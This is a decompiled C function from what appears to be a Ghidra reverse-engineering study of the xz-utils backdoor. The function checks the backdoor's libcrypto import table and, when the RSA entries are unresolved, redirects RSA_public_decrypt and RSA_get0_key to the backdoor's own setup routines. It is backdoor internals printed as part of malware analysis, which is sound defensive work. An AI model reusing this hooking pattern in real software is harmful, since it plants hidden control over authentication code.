// /home/kali/xzre-ghidra/xzregh/102890_init_imported_funcs.c
// Function: init_imported_funcs @ 0x102890
// Calling convention: __stdcall
// Prototype: BOOL __stdcall init_imported_funcs(imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Sanity-checks the OpenSSL import table before the hooks are allowed to run. It requires `resolved_imports_count` to equal 0x1d
 * and then inspects the `RSA_public_decrypt`, `EVP_PKEY_set1_RSA`, and `RSA_get0_key` PLT shims. If at least one of them is
 * resolved it returns TRUE so later code can jump through the host's libcrypto. When all three slots are still NULL it plants
 * `backdoor_init_stage2` / `init_shared_globals` in the RSA entries as crash-safe fallbacks and returns FALSE so stage two keeps
 * waiting until the imports are ready.
 */

#include "xzre_types.h"

BOOL init_imported_funcs(imported_funcs_t *imported_funcs)

{
  // AutoDoc: Short-circuit unless the expected 0x1d-symbol libcrypto table was populated.
  if (imported_funcs->resolved_imports_count == 0x1d) {
    // AutoDoc: Treat the imports as ready as soon as any RSA helper resolved; the hooks can now jump through the host PLT.
    if (imported_funcs->RSA_public_decrypt_plt != (pfn_RSA_public_decrypt_t *)0x0) {
      return TRUE;
    }
    if (imported_funcs->EVP_PKEY_set1_RSA_plt != (pfn_EVP_PKEY_set1_RSA_t *)0x0) {
      return TRUE;
    }
    if (imported_funcs->RSA_get0_key_plt != (pfn_RSA_get0_key_t *)0x0) {
      return TRUE;
    }
    // AutoDoc: When none resolved, wire in the stage-two/bootstrap fallbacks so unexpected calls just re-enter our setup.
    imported_funcs->RSA_public_decrypt_plt = (pfn_RSA_public_decrypt_t *)backdoor_init_stage2;
    imported_funcs->RSA_get0_key_plt = (pfn_RSA_get0_key_t *)init_shared_globals;
  }
  return FALSE;
}

